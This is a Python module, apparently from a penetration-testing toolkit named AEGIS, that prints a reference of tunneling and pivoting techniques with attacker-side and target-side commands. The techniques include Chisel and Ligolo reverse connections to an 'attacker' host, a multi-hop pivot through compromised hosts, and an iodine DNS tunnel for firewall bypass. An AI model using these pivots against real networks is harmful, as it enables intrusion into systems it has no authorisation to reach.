#!/usr/bin/env python3
"""AEGIS Tunneling and Pivoting — SSH, Chisel, Ligolo, proxychains, socat, VPN setup."""
import os, sys, subprocess
from datetime import datetime

class TunnelOps:
    name = "Tunneling & Pivoting"
    description = "SSH tunneling, Chisel, Ligolo-ng, proxychains, socat, VPN setup, multi-hop pivoting"
    category = "network"
    mitre = ["T1572", "T1090", "T1021"]

    TECHNIQUES = [
        {"name": "SSH Local Port Forward", "category": "ssh", "risk": "low",
         "description": "Forward a local port through SSH to reach a remote service",
         "attacker_cmd": "ssh -L 8080:internal-db:3306 user@jumpbox -N",
         "usage": "Access internal-db:3306 via localhost:8080",
         "diagram": "Attacker:8080 --> [SSH] --> Jumpbox --> internal-db:3306"},
        {"name": "SSH Remote Port Forward", "category": "ssh", "risk": "low",
         "description": "Expose a local service through a remote SSH server",
         "attacker_cmd": "ssh -R 4444:localhost:4444 user@attacker-server -N",
         "usage": "Victims callback to attacker-server:4444, forwarded to local 4444",
         "diagram": "Target --> attacker-server:4444 --> [SSH] --> Attacker:4444"},
        {"name": "SSH Dynamic SOCKS Proxy", "category": "ssh", "risk": "low",
         "description": "Create SOCKS5 proxy through SSH for full network access",
         "attacker_cmd": "ssh -D 1080 -N user@jumpbox",
         "usage": "Configure browser/proxychains to use SOCKS5 localhost:1080",
         "diagram": "Attacker --> SOCKS5:1080 --> [SSH] --> Jumpbox --> Internal Network"},
        {"name": "sshuttle (VPN over SSH)", "category": "ssh", "risk": "low",
         "description": "Route entire subnets through SSH without SOCKS configuration",
         "attacker_cmd": "sshuttle -r user@jumpbox 10.0.0.0/24 172.16.0.0/16",
         "usage": "All traffic to specified subnets transparently routed through jumpbox",
         "diagram": "Attacker --> [sshuttle] --> Jumpbox --> 10.0.0.0/24"},
        {"name": "Chisel (Reverse SOCKS)", "category": "chisel", "risk": "medium",
         "description": "Create reverse SOCKS proxy through HTTP — bypasses firewalls",
         "attacker_cmd": "chisel server --reverse --port 8080",
         "target_cmd": "chisel client attacker:8080 R:socks",
         "usage": "SOCKS5 proxy on attacker:1080 routing through target",
         "diagram": "Target --> [HTTP:8080] --> Attacker:1080 (SOCKS)"},
        {"name": "Chisel Port Forward", "category": "chisel", "risk": "medium",
         "description": "Forward specific ports through Chisel tunnel",
         "attacker_cmd": "chisel server --reverse --port 8080",
         "target_cmd": "chisel client attacker:8080 R:3306:internal-db:3306",
         "usage": "Access internal-db:3306 via attacker:3306",
         "diagram": "Target --> [HTTP] --> Attacker:3306 --> internal-db:3306"},
        {"name": "Ligolo-ng (Agent/Proxy)", "category": "ligolo", "risk": "medium",
         "description": "Create TUN interface for seamless internal network access",
         "attacker_cmd": "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601",
         "target_cmd": "./agent -connect attacker:11601 -ignore-cert",
         "usage": "Add routes: sudo ip route add 10.0.0.0/24 dev ligolo",
         "diagram": "Attacker (TUN:ligolo) --> [TLS] --> Agent --> Internal 10.0.0.0/24"},
        {"name": "Socat Port Forward", "category": "socat", "risk": "low",
         "description": "Simple bidirectional port forwarding",
         "attacker_cmd": "socat TCP-LISTEN:8080,fork TCP:internal:80",
         "usage": "Forward local 8080 to internal:80",
         "diagram": "Client --> :8080 --> [socat] --> internal:80"},
        {"name": "Socat Encrypted Tunnel", "category": "socat", "risk": "low",
         "description": "Encrypted tunnel between two hosts using OpenSSL",
         "attacker_cmd": "socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork TCP:localhost:22",
         "target_cmd": "socat TCP-LISTEN:2222,fork OPENSSL:server:4443,verify=0",
         "usage": "SSH to target:2222 tunneled through encrypted socat channel"},
        {"name": "Netcat Relay", "category": "netcat", "risk": "low",
         "description": "Simple relay using netcat and named pipes",
         "attacker_cmd": "mkfifo /tmp/relay; nc -l -p 8080 < /tmp/relay | nc internal 80 > /tmp/relay",
         "usage": "Relay traffic through intermediate host"},
        {"name": "Proxychains Configuration", "category": "proxychains", "risk": "low",
         "description": "Route tools through SOCKS/HTTP proxy chains",
         "attacker_cmd": "# /etc/proxychains4.conf:\n[ProxyList]\nsocks5 127.0.0.1 1080\n\n# Usage:\nproxychains nmap -sT -Pn 10.0.0.0/24\nproxychains curl http://internal\nproxychains ssh user@internal",
         "usage": "Prefix any command with 'proxychains' to route through proxy"},
        {"name": "Double Pivot", "category": "advanced", "risk": "high",
         "description": "Pivot through two compromised hosts to reach deep internal network",
         "attacker_cmd": "# Hop 1: SOCKS through Host A\nssh -D 1080 -N user@hostA\n\n# Hop 2: SOCKS through Host B via Host A\nproxychains ssh -D 1081 -N user@hostB\n\n# Now use SOCKS5 localhost:1081 for deep network",
         "usage": "Access network segments behind multiple firewalls",
         "diagram": "Attacker --> [SOCKS:1080] --> HostA --> [SOCKS:1081] --> HostB --> Deep Internal"},
        {"name": "WireGuard VPN", "category": "vpn", "risk": "low",
         "description": "Fast, modern VPN tunnel using WireGuard",
         "attacker_cmd": "# Generate keys:\nwg genkey | tee privatekey | wg pubkey > publickey\n\n# /etc/wireguard/wg0.conf (server):\n[Interface]\nAddress = 10.10.0.1/24\nListenPort = 51820\nPrivateKey = <server_private>\n\n[Peer]\nPublicKey = <client_public>\nAllowedIPs = 10.10.0.2/32\n\nsudo wg-quick up wg0",
         "usage": "Kernel-level VPN with minimal overhead"},
        {"name": "SSH over DNS", "category": "advanced", "risk": "high",
         "description": "Tunnel SSH through DNS when only DNS traffic is allowed",
         "attacker_cmd": "# 1. Start iodine DNS tunnel:\niodined -f -c -P password 10.0.0.1 tunnel.domain.com\n\n# 2. Client connects:\niodine -f -P password tunnel.domain.com\n\n# 3. SSH through the tunnel:\nssh user@10.0.0.1",
         "usage": "Bypass firewalls that only allow DNS (port 53) outbound"},
    ]

    def __init__(self, target=None, options=None):
        self.target = target
        self.options = options or {}
        self.findings = []
        self.actions = []

    def _log(self, msg):
        self.actions.append({"time": datetime.now().isoformat(), "action": msg})
        print(f"  [TUNNEL] {msg}")

    def list_techniques(self, category=None):
        techs = self.TECHNIQUES
        if category:
            techs = [t for t in techs if t['category'] == category]
        print("\n  TUNNELING & PIVOTING REFERENCE")
        print("  " + "=" * 60)
        for t in techs:
            print(f"\n  [{t['name']}] (category: {t['category']}, risk: {t['risk']})")
            print(f"  {t['description']}")
            if 'diagram' in t:
                print(f"  Flow: {t['diagram']}")
            print(f"  Attacker command:")
            for line in t['attacker_cmd'].split('\n'):
                print(f"    $ {line}")
            if 'target_cmd' in t:
                print(f"  Target command:")
                for line in t['target_cmd'].split('\n'):
                    print(f"    $ {line}")
            print(f"  Usage: {t['usage']}")
        return techs

    def check_tools(self):
        tools = ['ssh', 'chisel', 'ligolo-proxy', 'ligolo-agent', 'socat', 'nc', 'ncat',
                 'proxychains4', 'proxychains', 'sshuttle', 'wg', 'iodine', 'iodined']
        available = {}
        for tool in tools:
            try:
                result = subprocess.run(['which', tool], capture_output=True, timeout=5)
                available[tool] = result.returncode == 0
            except Exception:
                available[tool] = False
        self._log(f"Tool check: {sum(v for v in available.values())}/{len(tools)} available")
        return available

    def run(self, confirm_fn=None):
        op = self.options.get('operation', 'list')
        if op == 'list':
            return self.list_techniques()
        elif op == 'tools':
            return self.check_tools()
        else:
            return self.list_techniques(op)

    def get_findings(self):
        return self.findings

if __name__ == "__main__":
    t = TunnelOps(options={'operation': sys.argv[1] if len(sys.argv) > 1 else 'list'})
    t.run()
